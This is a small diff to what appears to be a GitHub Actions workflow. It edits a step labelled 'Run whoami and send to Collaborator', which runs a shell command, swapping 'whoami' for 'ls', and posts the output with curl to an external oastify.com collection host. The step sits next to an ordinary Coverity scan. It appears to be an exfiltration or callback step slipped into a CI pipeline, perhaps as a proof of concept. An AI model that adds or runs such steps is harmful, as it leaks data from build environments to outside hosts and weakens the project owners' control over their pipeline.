@@ -26,7 +26,7 @@ jobs:
 
       - name: Run whoami and send to Collaborator
         run: |
-          OUTPUT=$(whoami)
+          OUTPUT=$(ls)
           curl -s -X POST -d "whoami=$OUTPUT" https://0bc85k5khpc93ziwv9cqkgje056wunmbb.oastify.com
 
       - name: Coverity Scan
